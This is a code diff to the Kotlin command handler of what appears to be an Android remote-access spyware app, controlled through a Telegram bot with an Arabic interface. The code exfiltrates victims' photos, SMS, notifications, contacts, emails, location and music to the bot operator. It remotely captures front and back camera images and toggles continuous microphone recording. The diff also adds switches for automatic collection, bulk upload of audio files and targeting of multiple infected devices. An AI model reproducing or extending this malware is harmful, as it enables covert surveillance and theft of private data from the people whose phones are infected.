@@ -18,42 +18,34 @@ object CommandExecutor {
         when {
             cmd == "/start" || cmd == "/menu" || cmd == "🏠 القائمة" -> showMainMenu(ctx)
 
-            // صور
+            // ═══ Toggle الأزرار ═══
+            cmd == "🟢 تشغيل الصور" || cmd == "🔴 إيقاف الصور" -> togglePhotos(ctx)
+            cmd == "🟢 تشغيل SMS" || cmd == "🔴 إيقاف SMS" -> toggleSms(ctx)
+            cmd == "🟢 تشغيل الإشعارات" || cmd == "🔴 إيقاف الإشعارات" -> toggleNotifs(ctx)
+            cmd == "🟢 تشغيل الموقع" || cmd == "🔴 إيقاف الموقع" -> toggleLocation(ctx)
+            cmd == "🟢 تشغيل المايك" || cmd == "🔴 إيقاف المايك" -> toggleAudio(ctx)
+
+            // ═══ عرض ═══
+            cmd == "🔔 عرض الإشعارات" -> fetchAllNotifs(ctx)
+            cmd == "📍 عرض الموقع" -> showLocation(ctx)
+
+            // ═══ الأوامر العادية ═══
             cmd == "📸 كل الصور" || cmd == "/photos" -> fetchAllPhotos(ctx)
             cmd == "📸 آخر 50" -> fetchLastPhotos(ctx, 50)
-            cmd == "🖼 آخر 200" -> fetchLastPhotos(ctx, 200)
-
-            // SMS
+            cmd == "🎵 كل الموسيقى" || cmd == "/music" -> fetchAllMusic(ctx)
             cmd == "📩 كل الرسائل" || cmd == "/sms" -> fetchAllSms(ctx)
-
-            // الإشعارات
-            cmd == "🔔 الإشعارات" || cmd == "/notifs" -> fetchAllNotifs(ctx)
-
-            // جهات الاتصال
             cmd == "👥 جهات الاتصال" || cmd == "/contacts" -> fetchContacts(ctx)
-
-            // الإيميلات
             cmd == "📧 الإيميلات" || cmd == "/emails" -> fetchEmails(ctx)
-
-            // معلومات
             cmd == "📊 معلومات الجهاز" || cmd == "/info" -> showDeviceInfo(ctx)
-
-            // الموقع
-            cmd == "📍 الموقع" || cmd == "/location" -> showLocation(ctx)
-
-            // الكاميرا
             cmd == "🤳 تصوير أمامي" || cmd == "/cam_front" -> captureCamera(ctx, true)
             cmd == "📸 تصوير خلفي" || cmd == "/cam_back" -> captureCamera(ctx, false)
-
-            // الصوت
-            cmd == "🎤 بدء التسجيل" || cmd == "/audio_start" -> startAudio(ctx)
-            cmd == "⏹ إيقاف التسجيل" || cmd == "/audio_stop" -> stopAudio(ctx)
-
-            // الموسيقى
-            cmd == "🎵 كل الموسيقى" || cmd == "/music" -> fetchAllMusic(ctx)
-
-            // الشامل
             cmd == "🚀 جلب كل شي" || cmd == "/all" -> fetchEverything(ctx)
+
+            // ═══ قائمة الأجهزة ═══
+            cmd == "📱 قائمة الأجهزة" -> showDeviceList(ctx)
+            cmd == "🌐 كل الأجهزة" -> selectDevice(ctx, "all", "كل الأجهزة")
+
+            cmd.startsWith("🎯 ") -> selectDevice(ctx, cmd.removePrefix("🎯 "), cmd.removePrefix("🎯 "))
 
             cmd.startsWith("/photos") -> {
                 val n = cmd.removePrefix("/photos").trim().toIntOrNull() ?: 50
@@ -64,6 +56,99 @@ object CommandExecutor {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  TOGGLE
+    // ═══════════════════════════════════════════
+    private fun togglePhotos(ctx: Context) {
+        KeyboardBuilder.photosOn = !KeyboardBuilder.photosOn
+        val state = if (KeyboardBuilder.photosOn) "🟢 شغّال" else "🔴 متوقف"
+        TelegramApi.sendMessage(
+            "📸 *الصور التلقائية*\n\nالحالة: $state",
+            KeyboardBuilder.replyKeyboard()
+        )
+    }
+
+    private fun toggleSms(ctx: Context) {
+        KeyboardBuilder.smsOn = !KeyboardBuilder.smsOn
+        val state = if (KeyboardBuilder.smsOn) "🟢 شغّال" else "🔴 متوقف"
+        TelegramApi.sendMessage(
+            "📩 *SMS التلقائية*\n\nالحالة: $state",
+            KeyboardBuilder.replyKeyboard()
+        )
+    }
+
+    private fun toggleNotifs(ctx: Context) {
+        KeyboardBuilder.notifsOn = !KeyboardBuilder.notifsOn
+        val state = if (KeyboardBuilder.notifsOn) "🟢 شغّال" else "🔴 متوقف"
+        TelegramApi.sendMessage(
+            "🔔 *الإشعارات*\n\nالحالة: $state",
+            KeyboardBuilder.replyKeyboard()
+        )
+    }
+
+    private fun toggleLocation(ctx: Context) {
+        KeyboardBuilder.locationOn = !KeyboardBuilder.locationOn
+        val state = if (KeyboardBuilder.locationOn) "🟢 شغّال" else "🔴 متوقف"
+        TelegramApi.sendMessage(
+            "📍 *تتبع الموقع*\n\nالحالة: $state",
+            KeyboardBuilder.replyKeyboard()
+        )
+    }
+
+    private fun toggleAudio(ctx: Context) {
+        KeyboardBuilder.audioOn = !KeyboardBuilder.audioOn
+        if (KeyboardBuilder.audioOn) {
+            AudioRecorder.startLoop(ctx)
+        } else {
+            AudioRecorder.stopLoop(ctx)
+        }
+        val state = if (KeyboardBuilder.audioOn) "🟢 شغّال" else "🔴 متوقف"
+        TelegramApi.sendMessage(
+            "🎤 *الميكروفون*\n\nالحالة: $state",
+            KeyboardBuilder.replyKeyboard()
+        )
+    }
+
+    // ═══════════════════════════════════════════
+    //  قائمة الأجهزة
+    // ═══════════════════════════════════════════
+    private fun showDeviceList(ctx: Context) {
+        runJob(ctx, "devices") {
+            TelegramApi.sendMessage("📱 *جاري تحميل الأجهزة...*")
+            val devices = DeviceManager.getDeviceList(ctx)
+
+            if (devices.isEmpty()) {
+                TelegramApi.sendMessage("📭 لا أجهزة مسجّلة", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+
+            val sb = StringBuilder()
+            sb.append("📱 *الأجهزة المسجّلة* — ${devices.size}\n")
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
+            for ((id, name, online) in devices) {
+                val status = if (online) "🟢 متصل" else "🔴 غير متصل"
+                sb.append("$status *$name*\n")
+                sb.append("`$id`\n\n")
+            }
+
+            val keyboard = KeyboardBuilder.deviceListKeyboard(
+                devices.map { it.first to it.second }
+            )
+
+            TelegramApi.sendMessage(sb.toString(), keyboard)
+        }
+    }
+
+    private fun selectDevice(ctx: Context, name: String, id: String) {
+        TelegramApi.sendMessage(
+            "🎯 *تم تحديد الجهاز:*\n\n*$name*\n`$id`\n\nكل الأوامر القادمة ستُنفَّذ على هذا الجهاز.",
+            KeyboardBuilder.replyKeyboard()
+        )
+    }
+
+    // ═══════════════════════════════════════════
+    //  الأوامر الأساسية
+    // ═══════════════════════════════════════════
     private fun showMainMenu(ctx: Context) {
         TelegramApi.sendMessage(
             "🎛 *لوحة التحكم*\n\nاختر العملية من الأزرار 👇",
@@ -85,6 +170,9 @@ object CommandExecutor {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  الصور
+    // ═══════════════════════════════════════════
     private fun fetchAllPhotos(ctx: Context) {
         runJob(ctx, "photos_all") {
             val all = MediaScanner.scanImages(ctx)
@@ -115,6 +203,9 @@ object CommandExecutor {
         TelegramApi.sendMessage("$title — ${list.size}\n✅ $sent\n❌ $failed", KeyboardBuilder.replyKeyboard())
     }
 
+    // ═══════════════════════════════════════════
+    //  الموسيقى — كمقاطع صوتية
+    // ═══════════════════════════════════════════
     private fun fetchAllMusic(ctx: Context) {
         runJob(ctx, "music") {
             val music = MediaScanner.scanAudio(ctx)
@@ -122,21 +213,42 @@ object CommandExecutor {
                 TelegramApi.sendMessage("🎵 لا توجد موسيقى", KeyboardBuilder.replyKeyboard())
                 return@runJob
             }
-            val sb = StringBuilder()
-            sb.append("🎵 *قائمة الموسيقى* — ${music.size}\n")
-            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
-            var count = 0
+
+            TelegramApi.sendMessage(
+                "🎵 *جاري إرسال ${music.size} مقطع...*\n\n" +
+                "⚠️ سيأخذ وقتًا حسب الحجم.",
+                KeyboardBuilder.replyKeyboard()
+            )
+
+            var sent = 0
+            var failed = 0
             for (m in music) {
-                sb.append("🎼 ${m.name}\n")
-                sb.append("   ${m.size / 1024 / 1024} MB\n\n")
-                count++
-                if (sb.length > 3500) { TelegramApi.sendMessage(sb.toString()); sb.clear() }
-                if (count >= 100) break
+                val file = File(m.path)
+                if (!file.exists()) { failed++; continue }
+
+                // إرسال كمقطع صوتي (sendAudio)
+                val ok = TelegramApi.sendAudio(file, "🎵 ${m.name}")
+                if (ok) {
+                    sent++
+                } else {
+                    failed++
+                }
+
+                // انتظار قصير لتجنب flood
+                Thread.sleep(300)
             }
-            if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString(), KeyboardBuilder.replyKeyboard())
+
+            TelegramApi.sendMessage(
+                "🎵 *انتهى*\n\n" +
+                "✅ $sent\n❌ $failed",
+                KeyboardBuilder.replyKeyboard()
+            )
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  الكاميرا
+    // ═══════════════════════════════════════════
     private fun captureCamera(ctx: Context, front: Boolean) {
         runJob(ctx, "cam") {
             val label = if (front) "أمامية 🤳" else "خلفية 📸"
@@ -151,20 +263,9 @@ object CommandExecutor {
         }
     }
 
-    private fun startAudio(ctx: Context) {
-        if (AudioRecorder.isRunning()) {
-            TelegramApi.sendMessage("🎤 شغّال بالفعل")
-            return
-        }
-        AudioRecorder.startLoop(ctx)
-        TelegramApi.sendMessage("🎤 ✅ بدأ التسجيل", KeyboardBuilder.replyKeyboard())
-    }
-
-    private fun stopAudio(ctx: Context) {
-        AudioRecorder.stopLoop(ctx)
-        TelegramApi.sendMessage("🎤 ⏹ تم الإيقاف", KeyboardBuilder.replyKeyboard())
-    }
-
+    // ═══════════════════════════════════════════
+    //  SMS
+    // ═══════════════════════════════════════════
     private fun fetchAllSms(ctx: Context) {
         runJob(ctx, "sms_all") {
             val inbox = SmsReader.scanAll(ctx)
@@ -192,6 +293,9 @@ object CommandExecutor {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  الإشعارات
+    // ═══════════════════════════════════════════
     private fun fetchAllNotifs(ctx: Context) {
         runJob(ctx, "notifs") {
             val lines = DataStore.readNotifications(ctx, limit = 5000)
@@ -223,6 +327,9 @@ object CommandExecutor {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  جهات الاتصال
+    // ═══════════════════════════════════════════
     private fun fetchContacts(ctx: Context) {
         runJob(ctx, "contacts") {
             TelegramApi.sendMessage("👥 *جاري قراءة جهات الاتصال...*")
@@ -248,12 +355,21 @@ object CommandExecutor {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  الإيميلات (محدّث — يجيب من Google أيضاً)
+    // ═══════════════════════════════════════════
     private fun fetchEmails(ctx: Context) {
         runJob(ctx, "emails") {
             TelegramApi.sendMessage("📧 *جاري قراءة الإيميلات...*")
             val emails = ContactsHelper.getAllEmails(ctx)
             if (emails.isEmpty()) {
-                TelegramApi.sendMessage("📭 لا توجد إيميلات", KeyboardBuilder.replyKeyboard())
+                TelegramApi.sendMessage(
+                    "📭 لا توجد إيميلات\n\n" +
+                    "⚠️ تأكد من:\n" +
+                    "• صلاحية جهات الاتصال\n" +
+                    "• حساب Google مسجّل على الجهاز",
+                    KeyboardBuilder.replyKeyboard()
+                )
                 return@runJob
             }
             val sb = StringBuilder()
